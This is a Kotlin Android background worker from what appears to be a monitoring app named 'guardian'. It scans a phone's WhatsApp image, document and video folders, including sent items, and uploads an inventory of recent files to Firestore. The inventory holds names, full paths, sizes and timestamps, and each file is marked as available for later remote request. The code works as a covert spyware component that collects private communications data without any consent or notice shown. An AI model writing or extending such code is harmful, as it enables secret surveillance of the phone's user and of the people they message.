package com.device.guardian.service.worker

import android.content.Context
import android.os.Environment
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.device.guardian.service.data.local.AppDatabase
import com.device.guardian.service.data.remote.FirebaseRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.net.URLConnection

/**
 * Scans WhatsApp media folders and syncs a lightweight inventory of files to Firestore.
 * Does NOT upload the files themselves, saving data and storage limits.
 */
class MediaMetadataWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private const val TAG = "MediaMetadataWorker"
        
        // Primary media folders for WhatsApp
        private val MEDIA_FOLDERS = listOf(
            "WhatsApp Images",
            "WhatsApp Documents",
            "WhatsApp Video"
        )
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        Log.d(TAG, "Starting media metadata scan...")
        
        val localDb = AppDatabase.getInstance(applicationContext)
        val repo = FirebaseRepository(localDb.messageDao(), applicationContext)
        
        try {
            val inventory = scanWhatsAppMedia()
            
            if (inventory.isNotEmpty()) {
                Log.d(TAG, "Found ${inventory.size} media files. Syncing to Firestore...")
                repo.syncMediaInventory(inventory)
            } else {
                Log.d(TAG, "No media files found.")
            }
            
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to scan media: ${e.message}", e)
            Result.retry()
        }
    }

    private fun scanWhatsAppMedia(): List<Map<String, Any>> {
        val inventory = mutableListOf<Map<String, Any>>()
        
        // Standard location for WhatsApp Media in Android 11+
        val baseDir = File(
            Environment.getExternalStorageDirectory(),
            "Android/media/com.whatsapp/WhatsApp/Media"
        )

        // Fallback for older Android versions
        val fallbackDir = File(
            Environment.getExternalStorageDirectory(),
            "WhatsApp/Media"
        )

        val targetDir = if (baseDir.exists()) baseDir else fallbackDir

        if (!targetDir.exists()) {
            Log.w(TAG, "WhatsApp media directory not found at $targetDir")
            return emptyList()
        }

        // Only scan the last 30 days of files to prevent huge payloads
        val cutoffTime = System.currentTimeMillis() - (30L * 24 * 60 * 60 * 1000)

        for (folderName in MEDIA_FOLDERS) {
            val folder = File(targetDir, folderName)
            if (folder.exists() && folder.isDirectory) {
                // Include "Private" folder to catch sent/received items that don't hit gallery
                val allFiles = mutableListOf<File>()
                
                folder.listFiles()?.filter { it.isFile }?.let { allFiles.addAll(it) }
                
                // Add sent files
                val sentFolder = File(folder, "Sent")
                if (sentFolder.exists()) {
                    sentFolder.listFiles()?.filter { it.isFile }?.let { allFiles.addAll(it) }
                }

                // Filter, map, and limit
                allFiles.filter { it.lastModified() > cutoffTime && it.length() > 0 }
                    .forEach { file ->
                        val mimeType = URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
                        val fileId = file.name.replace(".", "_") // Safe ID for Firestore

                        inventory.add(
                            mapOf(
                                "fileId" to fileId,
                                "fileName" to file.name,
                                "filePath" to file.absolutePath,
                                "sizeBytes" to file.length(),
                                "lastModified" to file.lastModified(),
                                "mimeType" to mimeType,
                                "folder" to folderName,
                                "requestStatus" to "AVAILABLE" // Initial status
                            )
                        )
                    }
            }
        }
        
        // Sort by newest first and limit to max 500 files to avoid Firestore batch limits
        return inventory.sortedByDescending { it["lastModified"] as Long }.take(500)
    }
}
